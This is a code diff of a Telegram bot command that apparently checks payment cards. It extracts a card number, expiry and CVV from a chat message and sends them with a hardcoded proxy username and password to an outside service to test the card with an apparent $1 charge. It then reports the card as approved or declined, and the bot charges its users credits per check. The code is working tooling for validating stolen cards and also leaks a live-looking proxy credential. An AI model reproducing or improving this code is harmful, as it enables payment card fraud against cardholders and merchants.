@@ -18,7 +18,7 @@ async def cmd_clover(Client, message):
 
         regdata = fetchinfo(user_id)
         if not regdata:
-            return await message.reply("❌ You are not registered. Use /register first.", quote=True)
+            return await message.reply_text("❌ You are not registered. Use /register first.")
 
         role = (regdata[2] or "FREE").strip().upper()
         credit = int(regdata[5] or 0)
@@ -39,32 +39,30 @@ async def cmd_clover(Client, message):
 
         GROUP = open("plugins/group.txt").read().splitlines()
         if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in GROUP:
-            return await message.reply("❌ Unauthorized group. Contact admin.", quote=True)
+            return await message.reply_text("❌ Unauthorized group. Contact admin.")
 
         if credit < 1:
-            return await message.reply("❌ Insufficient credit.", quote=True)
-
+            return await message.reply_text("❌ Insufficient credit.")
         if now - antispam_time < wait_time:
-            return await message.reply(f"⏳ AntiSpam: wait {wait_time - (now - antispam_time)}s", quote=True)
+            return await message.reply_text(f"⏳ Wait {wait_time - (now - antispam_time)}s (AntiSpam)")
 
-        cc_raw = None
+        cc_text = None
         if message.reply_to_message:
-            cc_raw = (message.reply_to_message.text or message.reply_to_message.caption or "").strip()
+            cc_text = message.reply_to_message.text or message.reply_to_message.caption
         elif len(message.text.split(maxsplit=1)) > 1:
-            cc_raw = message.text.split(maxsplit=1)[1].strip()
+            cc_text = message.text.split(maxsplit=1)[1]
 
-        if not cc_raw:
-            return await message.reply("❌ Usage: /cl <cc|mm|yy|cvv> or reply to a card", quote=True)
+        if not cc_text:
+            return await message.reply_text("❌ Usage: /cl <cc|mm|yy|cvv> or reply to message")
 
-        cc_clean = re.sub(r"[^\d]", "|", cc_raw)
-        match = re.search(r"(\d{12,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})", cc_clean)
+        match = re.search(r"(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})", cc_text)
         if not match:
-            return await message.reply("❌ Invalid format. Use: xxxx xxxx xxxx xxxx|MM|YY|CVV", quote=True)
+            return await message.reply_text("❌ No valid CC found in reply or command.")
 
         ccnum, mes, ano, cvv = match.groups()
         fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"
 
-        check_msg = await message.reply(f"""
+        check_msg = await message.reply_text(f"""
 <code>┏━━━━━━━⍟</code>
 <b>┃  Clover 1$</b>
 <code>┗━━━━━━━━━━━⊛</code>
@@ -75,7 +73,7 @@ async def cmd_clover(Client, message):
 
         tic = time.perf_counter()
         try:
-            proxy = "proxy.rampageproxies.com:5000:package-1111111-country-us:5671nuWwEPrHCw2t"
+            proxy = "proxy.rampageproxies.com:5000:package-1111111-country-us-city-bloomington-region-indiana:5671nuWwEPrHCw2t"
             url = f"http://luckyxd.biz:1111/clv?cc={fullcc}&proxy={proxy}"
             res = session.get(url, timeout=50)
             data = res.json()
@@ -85,6 +83,7 @@ async def cmd_clover(Client, message):
 
         toc = time.perf_counter()
 
+        # BIN lookup
         try:
             binres = session.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}", timeout=10).json()
             brand = binres.get("brand") or binres.get("scheme") or "UNKNOWN"
@@ -99,11 +98,7 @@ async def cmd_clover(Client, message):
 
         brand, type_, level, bank, country = [i.upper() for i in [brand, type_, level, bank, country]]
 
-        msg_lower = card_message.lower()
-        if any(x in msg_lower for x in ["live", "approved", "success", "charged", "avs", "postal", "zip", "security code", "cvv", "cvc", "address"]):
-            status = "Approved ✅"
-        else:
-            status = "Declined ❌"
+        status = "Approved ✅" if any(x in card_message.lower() for x in ["live", "approved", "cvv", "avs", "postal", "zip"]) else "Declined ❌"
 
         final_msg = f"""
 <code>┏━━━━━━━⍟</code>
@@ -129,4 +124,4 @@ async def cmd_clover(Client, message):
         plan_expirychk(user_id)
 
     except Exception as e:
-        await message.reply_text(f"❌ Error: {str(e)}", quote=True)
+        await message.reply_text(f"❌ Error: {str(e)}")
